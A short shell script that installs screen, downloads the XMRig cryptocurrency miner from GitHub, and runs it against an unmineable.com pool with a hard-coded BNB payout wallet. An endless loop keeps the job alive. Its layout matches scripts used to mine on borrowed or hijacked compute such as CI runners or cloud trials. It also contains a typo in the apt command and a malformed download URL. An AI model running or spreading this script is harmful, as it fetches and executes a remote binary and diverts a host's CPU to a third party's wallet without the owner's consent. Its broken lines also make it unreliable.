#!/bin/sh
sudo apt udate
sudo apt install screen -y
wget https://github.com/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
tar xf xmrig-6.14.0-linux-x64.tar.gz
cd xmrig-6.14.0
./xmrig -o rx.unmineable.com:3333 -a xr -k -u BNB:bnb17gur7smrewxjk33ljussdv85ls8ezuvq43agk4.htg2k1miner6#ek61-6h9x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
